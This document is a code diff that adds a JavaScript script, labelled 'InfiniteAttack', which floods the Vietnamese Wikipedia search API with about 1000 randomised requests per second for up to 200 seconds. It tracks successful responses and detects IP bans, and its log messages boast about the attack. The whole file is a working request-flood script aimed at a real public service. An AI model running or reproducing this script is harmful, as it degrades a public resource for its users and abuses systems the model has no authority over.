@@ -1,0 +1,80 @@
+class InfiniteAttack {
+    constructor() {
+        this.stats = {
+            totalFired: 0,
+            success200: 0,
+            permanentBan: false
+        };
+        this.attackActive = true;
+        console.log('☢️  INFINITE 1000 REQ/S - NO MERCY MODE');
+    }
+    async launchAttackWave(waveNumber) {
+        const waveSize = 250; // 4 waves = 1000 requests
+        const totalWaves = 4;
+        for (let w = 0; w < totalWaves && this.attackActive; w++) {
+            const promises = [];
+            for (let i = 0; i < waveSize; i++) {
+                const uniqueID = Date.now() + Math.random() + waveNumber + w + i;
+                const url = `https://vi.wikipedia.org/w/api.php?action=query&format=json&origin=*&list=search&srsearch=kill${uniqueID}`;
+                promises.push(
+                    (async () => {
+                        try {
+                            const start = performance.now();
+                            const res = await fetch(url);
+                            this.stats.totalFired++;
+                            if (res.status === 200) {
+                                this.stats.success200++;
+                                const speed = performance.now() - start;
+                                if (this.stats.success200 <= 30) {
+                                    console.log(`[${waveNumber}.${w}] ✅ 200 (${speed.toFixed(0)}ms)`);
+                                }
+                            }
+                            if (res.status === 403 && !this.stats.permanentBan) {
+                                this.stats.permanentBan = true;
+                                console.log(`💀 PERMANENT BAN DETECTED - IP ĐÃ CHẾT!`);
+                            }
+                        } catch (err) {
+                            this.stats.totalFired++;
+                        }
+                    })()
+                );
+            }
+            Promise.allSettled(promises).catch(() => {});
+            if (w < totalWaves - 1) {
+                await new Promise(resolve => setTimeout(resolve, 0));
+            }
+        }
+    }
+    startInfiniteAttack() {
+        console.log('🔥 NUKE...\n');
+        let secondCounter = 0;
+        const attackInterval = setInterval(() => {
+            secondCounter++;
+            console.log(`⏰ GIÂY ${secondCounter}: Đã gửi ${this.stats.totalFired} requests | 200: ${this.stats.success200}`);
+            
+            if (this.stats.permanentBan) {
+                console.log(`🪦 ${secondCounter} GIÂY`);
+                clearInterval(attackInterval);
+                this.stop();
+            }
+            this.launchAttackWave(secondCounter);
+            
+        }, 1000);
+
+        this.stop = () => {
+            clearInterval(attackInterval);
+            this.attackActive = false;
+            console.log(`\n💀 KẾT THÚC SAU ${secondCounter} GIÂY:`);
+            console.log(`   Tổng requests: ${this.stats.totalFired}`);
+            console.log(`   200 OK: ${this.stats.success200}`);
+            console.log(`   Tỷ lệ: ${(this.stats.success200/this.stats.totalFired*100).toFixed(3)}%`);
+            console.log(`   IP GitHub đã BỊ BAN ${this.stats.permanentBan ? 'VĨNH VIỄN' : 'ít nhất 1 tháng'}`);
+        };
+    }
+}
+
+const deathWish = new InfiniteAttack();
+deathWish.startInfiniteAttack();
+setTimeout(() => {
+    if (deathWish.stop) deathWish.stop();
+}, 200000);
